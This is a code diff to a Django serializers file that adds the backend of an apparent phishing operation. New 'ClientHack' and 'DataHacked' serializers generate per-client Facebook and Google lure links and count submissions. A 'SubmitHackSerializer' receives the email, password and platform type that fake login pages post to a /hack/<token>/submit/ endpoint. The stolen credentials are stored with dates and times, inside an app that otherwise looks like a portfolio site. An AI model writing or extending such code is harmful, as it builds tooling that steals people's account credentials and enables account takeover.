@@ -12,7 +12,8 @@ from .models import (
     Email,
     EmailResponse,
     Experience,
-    Facebook,
+    ClientHack,
+    DataHacked,
     Formation,
     GalleryCategory,
     GalleryImage,
@@ -53,10 +54,44 @@ class _AbsoluteMediaUrlMixin:
         return f"{base}{media_url.rstrip('/')}/{url.lstrip('/')}"
 
 
-class FacebookSerializer(serializers.ModelSerializer):
+class ClientHackSerializer(serializers.ModelSerializer):
+    link_facebook = serializers.SerializerMethodField()
+    link_google   = serializers.SerializerMethodField()
+    submissions_count = serializers.SerializerMethodField()
+
     class Meta:
-        model = Facebook
-        fields = ["id", "email", "password", "date", "heure"]
+        model  = ClientHack
+        fields = [
+            "id", "name", "email", "token",
+            "link_facebook", "link_google",
+            "submissions_count",
+        ]
+        read_only_fields = ["id", "token", "link_facebook", "link_google", "submissions_count"]
+
+    def get_link_facebook(self, obj):
+        return obj.link_facebook
+
+    def get_link_google(self, obj):
+        return obj.link_google
+
+    def get_submissions_count(self, obj):
+        return obj.submissions.count()
+
+
+class DataHackedSerializer(serializers.ModelSerializer):
+    client_name = serializers.CharField(source="client.name", read_only=True)
+
+    class Meta:
+        model  = DataHacked
+        fields = ["id", "client", "client_name", "email", "password", "date", "heure", "type"]
+        read_only_fields = ["id", "date", "heure"]
+
+
+class SubmitHackSerializer(serializers.Serializer):
+    """Ce que le front (facebook ou google) poste sur /hack/<token>/submit/"""
+    email    = serializers.EmailField()
+    password = serializers.CharField()
+    type     = serializers.ChoiceField(choices=["facebook", "google"])
 
 
 class NotificationSerializer(serializers.ModelSerializer):
